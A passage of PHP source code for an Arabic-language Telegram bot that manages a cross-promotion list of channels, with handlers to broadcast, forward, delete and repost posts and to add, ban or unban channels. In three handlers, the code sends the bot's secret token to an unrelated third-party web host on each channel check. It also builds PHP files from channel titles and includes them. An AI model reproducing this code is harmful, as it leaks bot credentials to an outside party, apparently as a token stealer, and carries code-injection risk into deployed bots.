'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt12"]],
]])
]);
}
if($text == "نعم" and !$data and $unll == "okallcode"){

file_put_contents("unll.txt","");

$files = scandir('code');
for($ii=2;$ii<count($files);$ii++){
$text=$files[$ii];

 $get5=bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>$text."\nجاري نشر الكود انتضر قليلا ⚙️",
"message_id"=>$message_id,
]);
$msg_id = $get5->result->message_id;
include "code/$text/lista.php";
$getfull = file_get_contents("code/$text/txt.txt");
$getls = file_get_contents("code/$text/lista.php");
$gettxt = file_get_contents("code/$text/textlist.txt");
$getfile_id = file_get_contents("code/$text/text.txt");
$sens=file_get_contents("code/$text/tepe_code.txt");
$ss=str_replace("send","",$sens);
file_put_contents("up/".$msg_id."lista.php",$getls);
file_put_contents("up/".$msg_id."textlist.txt",$gettxt);
file_put_contents("up/".$msg_id."txt.txt",$getfull);
file_put_contents("up/".$msg_id."text.txt",$getfile_id);
file_put_contents("up/".$msg_id."tepe_code.txt",$sens);

if($sens=="text"){
for($i=0;$i<count($getids);$i++){
 $get=bot("sendMessage",[
"chat_id"=>$getids[$i],
"text"=>"$gettxt",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
"reply_markup"=>$list
]);
$get_send=$get->result;
if(!is_null($get_send))
{
$msg = $get->result->message_id;
file_put_contents("ms/$msg_id.txt",$getids[$i]."==".$msg."\n", FILE_APPEND);
}}
 bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"$gettxt",
'parse_mode'=>Markdown,
'disable_web_page_preview'=>true,
"reply_markup"=>$list
]);
}
else{
for($i=0;$i<count($getids);$i++){
 $get=bot($sens,[
"chat_id"=>$getids[$i],
"$ss"=>"$getfile_id",
'caption'=>"$getfull",
"reply_markup"=>$list
]);
$get_send=$get->result;
if(!is_null($get_send))
{
$msg = $get->result->message_id;
file_put_contents("ms/$msg_id.txt",$getids[$i]."==".$msg."\n", FILE_APPEND);
}}
 bot($sens,[
"chat_id"=>$chat_id,
"$ss"=>"$getfile_id",
'caption'=>"$getfull",
'parse_mode'=>Markdown,
'disable_web_page_preview'=>true,
"reply_markup"=>$list
]);
}
bot("editmessagetext",[
"chat_id"=>$chat_id,
"text"=>"تم نشر الكود بجميع القنوات ☑️",
"message_id"=>$msg_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"حذف الكود",'callback_data'=>"delecode"]],[['text'=>"رفع الكود",'callback_data'=>"upcode"]]
]])
]);
}}
# delecode
if($data == "delecode"){
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري حذف الكود انتضر قليلا 🗑",
"message_id"=>$message_id,
]);
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"❎ تـمَّـ - بِفضْلِ اللَّـه - حَـذْفـ اللسْتَـة",
]);
for($d=0;$d<count($getmes_id);$d++){
$ex = explode("==", $getmes_id[$d]);
$getmes_id1=$ex['1'];
$getids1=$ex['0'];
file_get_contents("https://api.telegram.org/bot$token/deleteMessage?chat_id=$getids1&message_id=$getmes_id1");
//}
}
$msg_id = $message_id;
unlink("up/".$msg_id."lista.php");
unlink("up/".$msg_id."textlist.txt");
unlink("up/".$msg_id."text.txt");
unlink("up/".$msg_id."tepe_code.txt");
unlink("ms/$message_id.txt");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"تم حذف الكود من جميع القنوات 🗑",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt12"]],
]])
]);
}
# upcode
if($data == "upcode"){
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري رفع الكود انتضر قليلا 🔄",
"message_id"=>$message_id,
]);
unlink("ms/$message_id.txt");

$msg_id = $message_id;

include "up/".$msg_id."lista.php";

$gettxt = file_get_contents("up/".$msg_id."textlist.txt");

$getfile_id = file_get_contents("up/".$msg_id."text.txt");

$getfull = file_get_contents("up/".$msg_id."txt.txt");

$sens=file_get_contents("up/".$msg_id."tepe_code.txt");

$ss=str_replace("send","",$sens);

for($d=0;$d<count($getmes_id);$d++){
$ex = explode("==", $getmes_id[$d]);
$getmes_id1=$ex['1'];
$getids1=$ex['0'];

file_get_contents("https://api.telegram.org/bot$token/deleteMessage?chat_id=$getids1&message_id=$getmes_id1");
if($sens=="text")
{
 $get=bot("sendMessage",[
"chat_id"=>$getids1,
"text"=>"$gettxt",
'parse_mode'=>Markdown,
'disable_web_page_preview'=>true,
"reply_markup"=>$list
]);
$get_send=$get->result;
if(!is_null($get_send))
{
$msg = $get->result->message_id;
file_put_contents("ms/$message_id.txt",$getids1."==".$msg."\n", FILE_APPEND);
}}
else{
 $get=bot($sens,[
"chat_id"=>$getids1,
"$ss"=>"$getfile_id",
'caption'=>"$getfull",
'parse_mode'=>Markdown,
'disable_web_page_preview'=>true,
"reply_markup"=>$list
]);
$get_send=$get->result;
if(!is_null($get_send))
{
$msg = $get->result->message_id;
file_put_contents("ms/$message_id.txt",$getids1."==".$msg."\n", FILE_APPEND);
}}}
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"☑️ تـمَّـ - بِفضْلِ اللَّـه - رَفــعُ اللسْتَــة",
]);
bot("editmessagetext",[
"chat_id"=>$chat_id,
"text"=>"تم رفع الكود بجميع القنوات ☑️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"حذف الكود",'callback_data'=>"delecode"],['text'=>"رفع الكود",'callback_data'=>"upcode"]],
]])
]);
}
# sendlink
if($data == "sendlink"){
file_put_contents("unll.txt", "oklink");
bot("editmessagetext",[
'chat_id'=>$chat_id, 
'text'=>"ارسل الان المنشور ياصديقي ‼️",
"message_id"=>$message_id,
'reply_markup'=>$back
]);
}
if($text and !$data and $unll == "oklink"){
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"جاري نشر المنشور انتضر قليلا ☑️",
]);
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"$text",
'parse_mode'=>MarkDown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id+1,
]);
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"✅ تـمَّـ - بِفضْلِ اللَّـه - نَشْــر اللسْتَــة.",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]);
$msg = $message_id+1;
file_put_contents("data/oo".$msg.".txt",$text);
for($i=0;$i<count($getids);$i++){

$get =bot('SendMessage', [
'chat_id' => $getids[$i],
'text'=>$text,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true
]);
$msg_id = $get->result->message_id;
file_put_contents("ms/$msg.txt",$getids[$i]."==". $msg_id."\n", FILE_APPEND);
}
file_put_contents("unll.txt", "");
bot("editmessagetext",[
"chat_id"=>$chat_id,
"text"=>"$text",
'parse_mode'=>MarkDown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id+1,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"حذف المنشور",'callback_data'=>"delelink"],['text'=>"رفع المنشور",'callback_data'=>"uplink"]],
]])
]);
}
# delelink
if($data == "delelink"){
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري حذف المنشور انتضر قليلا 🗑",
"message_id"=>$message_id,
]);
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"❎ تـمَّـ - بِفضْلِ اللَّـه - حَـذْفـ اللسْتَـة",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]);
for($d=0;$d<count($getmes_id);$d++){
$ex = explode("==", $getmes_id[$d]);
$getmes_id1=$ex['1'];
$getids1=$ex['0'];
file_get_contents("https://api.telegram.org/bot$token/deleteMessage?chat_id=$getids1&message_id=$getmes_id1");
}
unlink("data/oo".$message_id.".txt");
unlink("ms/$message_id.txt");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"تم حذف المنشور من جميع القنوات ☑️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt12"]],
]])
]);
}
if($data == "uplink"){
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري رفع المنشور انتضر قليلا 🔄",
"message_id"=>$message_id,
]);
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"☑️ تـمَّـ - بِفضْلِ اللَّـه - رَفــعُ اللسْتَــة",
'parse_mode'=>markdown,
'disable_web_page_preview'=>true,
]);
$text=file_get_contents("data/oo".$message_id.".txt");
unlink("ms/$message_id.txt");
for($d=0;$d<count($getmes_id);$d++){
$ex = explode("==", $getmes_id[$d]);
$getmes_id1=$ex['1'];
$getids1=$ex['0'];
file_get_contents("https://api.telegram.org/bot$token/deleteMessage?chat_id=$getids1&message_id=$getmes_id1");
$get =bot('SendMessage', [
'chat_id' => $getids1,
'text'=>$text,
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true
 
]);
$msg_id = $get->result->message_id;
file_put_contents("ms/$message_id.txt",$getids1."==". $msg_id."\n", FILE_APPEND);
}

bot("editmessagetext",[
"chat_id"=>$chat_id,
"text"=>"$text",
'parse_mode'=>MarkDown,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"حذف المنشور",'callback_data'=>"delelink"],['text'=>"رفع المنشور",'callback_data'=>"uplink"]],
]])
]);
}
# sendfwd
if($data == "sendfwd"){
file_put_contents("unll.txt", "okfwd");
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"ارسل الان المنشور الذي تريد  اعاده توجيهه ياصديقي ‼️",
"message_id"=>$message_id,
]);
}

if(!$data and $unll == "okfwd"){
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"جاري توجيه المنشور انتضر قليلا 🌀",
]);
$msg = $message_id+1;
file_put_contents("data/oo".$msg.".txt",$text);
for($i=0;$i<count($getids);$i++){

$get=bot('ForwardMessage',[
	'chat_id'=>$getids[$i],
	'from_chat_id'=>$chat_id,
	'message_id'=>$message_id
	]);
$msg_id = $get->result->message_id;
file_put_contents("ms/$msg.txt",$getids[$i]."==". $msg_id."\n", FILE_APPEND);
}
file_put_contents("unll.txt", "");

bot("editmessagetext",[
"chat_id"=>$chat_id,
"text"=>"تم التوجيه لهذا المنشور ✅",
'parse_mode'=>html,
'disable_web_page_preview'=>true,
"message_id"=>$message_id+1,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"حذف التوجيه",'callback_data'=>"delelink"],['text'=>"رفع التوجيه",'callback_data'=>"upfwd"]],
]])
]);
}
if($data == "upfwd"){
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري رفع التوجيه انتضر قليلا 🔄",
"message_id"=>$message_id,
]);
$text=file_get_contents("data/oo".$message_id.".txt");
unlink("ms/$message_id.txt");
for($d=0;$d<count($getmes_id);$d++){
$ex = explode("==", $getmes_id[$d]);
$getmes_id1=$ex['1'];
$getids1=$ex['0'];
$get=bot('ForwardMessage',[
	'chat_id'=>$getids1,
	'from_chat_id'=>$getids1,
	'message_id'=>$getmes_id1
	]);
$msg_id = $get->result->message_id;
file_put_contents("ms/$message_id.txt",$getids1."==". $msg_id."\n", FILE_APPEND);
file_get_contents("https://api.telegram.org/bot$token/deleteMessage?chat_id=$getids1&message_id=$getmes_id1");
}

bot("editmessagetext",[
"chat_id"=>$chat_id,
"text"=>"تم رفع التوجيه 🔄",
'parse_mode'=>html,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"حذف التوجيه",'callback_data'=>"delelink"],['text'=>"رفع التوجيه",'callback_data'=>"upfwd"]],
]])
]);
}
# sendhtml
if($data == "sendhtml"){
file_put_contents("unll.txt", "okhtml");
bot("editmessagetext",[
'chat_id'=>$chat_id, 
'text'=>"ارسل الان المنشور ياصديقي ‼️",
"message_id"=>$message_id,
'reply_markup'=>$back
]);
}
if($text and !$data and $unll == "okhtml"){
bot('sendMessage',[
'chat_id'=>$chat_id, 
'text'=>"جاري نشر المنشور انتضر قليلا ⚠️",
]);
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"✅ تـمَّـ - بِفضْلِ اللَّـه - نَشْــر اللسْتَــة.",
]);
$msg = $message_id+1;
file_put_contents("data/oo".$msg.".txt",$text);
for($i=0;$i<count($getids);$i++){

$get =bot('SendMessage', [
'text'=>$text,
'parse_mode'=>"html",
'disable_web_page_preview'=>true
]);
$msg_id = $get->result->message_id;
file_put_contents("ms/$msg.txt",$getids[$i]."==". $msg_id."\n", FILE_APPEND);
}
file_put_contents("unll.txt", "");
bot("editmessagetext",[
"chat_id"=>$chat_id,
"text"=>"$text",
'parse_mode'=>html,
'disable_web_page_preview'=>true,
"message_id"=>$message_id+1,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"حذف المنشور",'callback_data'=>"delelink"],['text'=>"رفع المنشو",'callback_data'=>"uphtml"]],
]])
]);
}
if($data == "uphtml"){
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري رفع المنشور انتضر قليلا 🔄",
"message_id"=>$message_id,
]);
$text=file_get_contents("data/oo".$message_id.".txt");
unlink("ms/$message_id.txt");
for($d=0;$d<count($getmes_id);$d++){
$ex = explode("==", $getmes_id[$d]);
$getmes_id1=$ex['1'];
$getids1=$ex['0'];
file_get_contents("https://api.telegram.org/bot$token/deleteMessage?chat_id=$getids1&message_id=$getmes_id1");
$get =bot('SendMessage', [
'chat_id' => $getids1,
'text'=>$text,
'parse_mode'=>"html",
'disable_web_page_preview'=>true
]);
$msg_id = $get->result->message_id;
file_put_contents("ms/$message_id.txt",$getids1."==". $msg_id."\n", FILE_APPEND);
}
bot("sendMessage",[
"chat_id"=>-1001387644097,
"text"=>"☑️ تـمَّـ - بِفضْلِ اللَّـه - رَفــعُ اللسْتَــة",
]);
bot("editmessagetext",[
"chat_id"=>$chat_id,
"text"=>"$text",
'parse_mode'=>html,
'disable_web_page_preview'=>true,
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"حذف المنشور",'callback_data'=>"delelink"],['text'=>"رفع المنشور",'callback_data'=>"uphtml"]],
]])
]);
}
#ghh
if($data == "ghh"){
file_put_contents("data/yeslist.txt", "");
file_put_contents("data/listaa.php", '<?php'."\n".'$getlistm = json_encode(['."\n".'"inline_keyboard"=>['."\n");
file_put_contents("data/nolist.txt", "");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"📎📎 جاري تحويل للسته جهتين  .",
"message_id"=>$message_id,
]);
for($i=0;$i<count($getids);$i++){
$ok = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChatAdministrators?chat_id=$getids[$i]"))->ok;
if($ok == 1){
$json1 = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$getids[$i]"))->result;
$user1 = $json1->username; 
$userl = "@".$user1." - ";
$name1 = $json1->title; 
 $name1=str_replace("'","",$name1);
$name1=str_replace('"','',$name1);
file_put_contents("data/yeslist.txt", "$userl", FILE_APPEND);
file_put_contents("data/listaa.php", "\n".'[["text"=>"'.$EMLST.$name1.$ESLST.'", "url"=>"https://t.me/'.$user1.'"],', FILE_APPEND);
file_put_contents("data/listaa.php", "\n".'["text"=>"'.$EMLST.$name1.$ESLST.'", "url"=>"https://t.me/'.$user1.'"]],', FILE_APPEND);
}
if($ok != 1){
$json2 = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$getids[$i]"))->result;
$user2 = $json2->username; 
$useri = "@".$user2." - ";
file_put_contents("data/nolist.txt", "$useri", FILE_APPEND);
}
}
$yes = file_get_contents("data/yeslist.txt");
$no = file_get_contents("data/nolist.txt");
file_put_contents("data/listaa.php", "\n[['text'=>'تابع جديدنا', 'url'=>'https://t.me/taattbot']]\n]]);", FILE_APPEND);
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ℓ🌀- القنوات المشاركة\n➖➖\n".$yes."\n➖➖\nℓ⛔️- القنوات المخالفة\n➖➖\n".$no."\n➖➖\nℓ⚙️- نوع لستة شفاف",
"message_id"=>$message_id,
'reply_markup'=>$back
]);
}
# res
if($data == "res"){
file_put_contents("data/yeslist.txt", "");
file_put_contents("data/lista.php", '<?php'."\n".'$getlist = json_encode(['."\n".'"inline_keyboard"=>['."\n");
file_put_contents("data/nolist.txt", "");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"⏱ جاري فحص القنوات
وتحويل لستة لي شفاف.",
"message_id"=>$message_id,
]);
for($i=0;$i<count($getids);$i++){
$ok = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChatAdministrators?chat_id=$getids[$i]"))->ok;
if($ok == 1){
$json1 = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$getids[$i]"))->result;
$user1 = $json1->username; 
$userl = "@".$user1." - ";
$name1 = $json1->title; 
 $name1=str_replace("'","",$name1);
$name1=str_replace('"','',$name1);
$ch = json_decode(file_get_contents("https://mrdgc.000webhostapp.com/api/ch.php?ch=@$user1&to=$token"));
$test=$ch->ch;
file_put_contents("data/yeslist.txt", "$userl", FILE_APPEND);
file_put_contents("data/lista.php", "\n".'[["text"=>"'.$EMLST.$test.$name1.$ESLST.'", "url"=>"https://t.me/'.$user1.'"]],', FILE_APPEND);
}
if($ok != 1){
$json2 = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$getids[$i]"))->result;
$user2 = $json2->username; 
$useri = "@".$user2." - ";
file_put_contents("data/nolist.txt", "$useri", FILE_APPEND);
}
}
$yes = file_get_contents("data/yeslist.txt");
$no = file_get_contents("data/nolist.txt");
file_put_contents("data/lista.php", "\n[['text'=>'للأشتراك', 'url'=>'https://t.me/taattbot']]\n]]);", FILE_APPEND);
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ℓ🌀- القنوات المشاركة\n➖➖\n".$yes."\n➖➖\nℓ⛔️- القنوات المخالفة\n➖➖\n".$no."\n➖➖\nℓ⚙️- نوع لستة شفاف",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taattbot"]],
]])
]);
}
# MRMOR
if($data == "MRMOR"){
file_put_contents("data/yeslist.txt", "");
file_put_contents("data/nolist.txt", "");
file_put_contents("data/MRTEST.txt", "$RALST\n");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"⏱ جاري فحص القنوات
وتحويل لستة لي معرفات.",
"message_id"=>$message_id,
]);
for($i=0;$i<count($getids);$i++){
$ok = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChatAdministrators?chat_id=$getids[$i]"))->ok;
if($ok == 1){
$json1 = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$getids[$i]"))->result;
$user1 = $json1->username; 
$userl = "@".$user1." - ";
$name1 = $json1->title; 
 $name1=str_replace("'","",$name1);
$name1=str_replace('"','',$name1);
$ch = json_decode(file_get_contents("https://mrdgc.000webhostapp.com/api/ch.php?ch=@$user1&to=$token"));
$test=$ch->ch;
file_put_contents("data/yeslist.txt", "$userl", FILE_APPEND);
file_put_contents("data/MRTEST.txt", "\n$EMLST $test$name1\n$ESLST @$user1\n$FASLST", FILE_APPEND);}
if($ok != 1){
$json2 = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$getids[$i]"))->result;
$user2 = $json2->username; 
$useri = "@".$user2." - ";
file_put_contents("data/nolist.txt", "$useri", FILE_APPEND);
}
}
$yes = file_get_contents("data/yeslist.txt");
$no = file_get_contents("data/nolist.txt");
file_put_contents("data/MRTEST.txt", "\n$ASLST", FILE_APPEND);
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ℓ🌀- القنوات المشاركة\n➖➖\n".$yes."\n➖➖\nℓ⛔️- القنوات المخالفة\n➖➖\n".$no."\n➖➖\nℓ⚙️- نوع لستة معرفات",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt11"]],
]])
]);
}}
# MRMRK
if($data == "MRMRK"){
file_put_contents("data/yeslist.txt", "");
file_put_contents("data/nolist.txt", "");
file_put_contents("data/MRTEST.txt", "$RALST\n");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"⏱ جاري فحص القنوات
وتحويل لستة لي ماركدون.",
"message_id"=>$message_id,
]);
for($i=0;$i<count($getids);$i++){
$ok = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChatAdministrators?chat_id=$getids[$i]"))->ok;
if($ok == 1){
$json1 = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$getids[$i]"))->result;
$user1 = $json1->username; 
$userl = "@".$user1." - ";
$name1 = $json1->title; 
 $name1=str_replace("'","",$name1);
$name1=str_replace('"','',$name1);
$ch = json_decode(file_get_contents("https://mrdgc.000webhostapp.com/api/ch.php?ch=@$user1&to=$token"));
$test=$ch->ch;
file_put_contents("data/yeslist.txt", "$userl", FILE_APPEND);
file_put_contents("data/MRTEST.txt", "\n$EMLST $test[$name1](t.me/$user1)\n $FASLST", FILE_APPEND);}
if($ok != 1){
$json2 = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$getids[$i]"))->result;
$user2 = $json2->username; 
$useri = "@".$user2." - ";
file_put_contents("data/nolist.txt", "$useri", FILE_APPEND);
}
}
$yes = file_get_contents("data/yeslist.txt");
$no = file_get_contents("data/nolist.txt");
file_put_contents("data/MRTEST.txt", "\n$ASLST", FILE_APPEND);
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ℓ🌀- القنوات المشاركة\n➖➖\n".$yes."\n➖➖\nℓ⛔️- القنوات المخالفة\n➖➖\n".$no."\n➖➖\nℓ⚙️- نوع لستة ماركدون",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt12"]],
]])
]);
}
# add
if($data == "add"){
file_put_contents("unll.txt", "add");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ارسل الان معرف القناة ‼️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt13"]],
]])
]);
}

if($text and !$data and $unll == "add" ){
$json = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$text"))->result->id;
if(!in_array($json, $getids)){
file_put_contents("data/ids.txt", "$json\n", FILE_APPEND);
file_put_contents("unll.txt", "");
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"تم اضافة القناة بنجاح ✅",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt13"]],
]])
]);
}else
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"القناة مشاركة بتأكيد عزيزي ⚠️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt13"]],
]])
]);
}
if($data == "dele"){
file_put_contents("unll.txt", "dele");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ارسل الان معرف القناة ‼️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt13"]],
]])
]);
}
if($text and !$data and $unll == "dele"){
$json = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$text"))->result->id;
$i = file_get_contents("data/ids.txt");
$i = str_replace($json, ' ', $i);
$i = preg_replace("/(^[\r\n]*|[\r\n]+)[\s\t]*[\r\n]+/", "\n", $i);
file_put_contents('data/ids.txt', $i);
file_put_contents("unll.txt", "");
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"تم حذف القناة بنجاح ⛔️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt13"]],
]])
]);
}
if($data == "delech"){
file_put_contents("data/ids.txt", "");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"تم حذف جميع القنوات 🗑",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt13"]],
]])
]);
}
if($data == "ban"){
file_put_contents("unll.txt", "ban");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ارسل الان معرف القناة ⛔️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt13"]],
]])
]);
}
if($text and !$data and $unll == "ban" ){
$json = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$text"))->result->id;
$i = file_get_contents("data/ids.txt");
$i = str_replace($json, ' ', $i);
$i = preg_replace("/(^[\r\n]*|[\r\n]+)[\s\t]*[\r\n]+/", "\n", $i);
file_put_contents('data/ids.txt', $i);
file_put_contents("data/ban.txt", "$json\n", FILE_APPEND);
file_put_contents("unll.txt", "ban");
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"تم حظر القناة ❌",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt13"]],
]])
]);
}
if($data == "unban"){
file_put_contents("unll.txt", "unban");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ارسل الان معرف القناة 🌀",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt13"]],
]])
]);
}
if($text and !$data and $unll == "unban"){
$json = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$text"))->result->id;
$i = file_get_contents("data/ban.txt");
$i = str_replace($json, ' ', $i);
$i = preg_replace("/(^[\r\n]*|[\r\n]+)[\s\t]*[\r\n]+/", "\n", $i);
file_put_contents('data/ban.txt', $i);
file_put_contents("data/ids.txt", "$json\n", FILE_APPEND);
file_put_contents("unll.txt", "");
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"تم رفع الحظر القناة ✅",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt13"]],
]])
]);
}
if($data == "listban"){
file_put_contents("data/banall.txt", "");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"جاري فحص القنوات ⚠️",
"message_id"=>$message_id,
]);
for($i=0;$i<count($getban);$i++){
$json1 = json_decode(file_get_contents("http://api.telegram.org/bot$token/getChat?chat_id=$getban[$i]"))->result;
$user1 = $json1->username; 
$userl = "@".$user1." - "; 
file_put_contents("data/banall.txt", "$userl", FILE_APPEND);
}
$banall = file_get_contents("data/banall.txt");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ℓ❌- القنوات المحظورة\n➖➖\n".$banall,
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt13"]],
]])
]);
}
if($data == "editstart"){
file_put_contents("unll.txt", "setstart");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ارسل الترحيب الذي تريد وضعه 📃",
"message_id"=>$message_id,
'reply_markup'=>$back
]);
}
if($text and !$data and $unll == "setstart"){
file_put_contents("data/start.txt", "$text");
file_put_contents("unll.txt", "");
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"تم تعديل الرسالة الترحيب ☑️",
"message_id"=>$message_id,
'reply_markup'=>$back
]);
}
if($data == "editlist"){
file_put_contents("unll.txt", "setlist");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ارسل الكليشة رئس الستة ‼️",
"message_id"=>$message_id,
'reply_markup'=>$back
]);
}
if($text and !$data and $unll == "setlist"){
file_put_contents("data/text.txt", "$text");
file_put_contents("unll.txt", "");
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"تم وضع رئس الى الستة ✅",
"message_id"=>$message_id,
'reply_markup'=>$back
]);
}
# RALST
if($data == "RALST"){
file_put_contents("unll.txt", "RALST");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ارسل الكليشة رئس الستة ⚠️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt14"]],
]])
]);
}
if($text and !$data and $unll == "RALST"){
file_put_contents("data/RALST.txt", "$text");
file_put_contents("unll.txt", "");
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"تم وضع رئس اعلى الستة ✔️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"↩️ - رجوع - ↪️",'callback_data'=>"taatt14"]],
]])
]);
}
# ASLST
if($data == "ASLST"){
file_put_contents("unll.txt", "ASLST");
bot('editmessagetext',[
'chat_id'=>$chat_id, 
'text'=>"ارسل الكليشة اسفل الستة ⚠️",
"message_id"=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
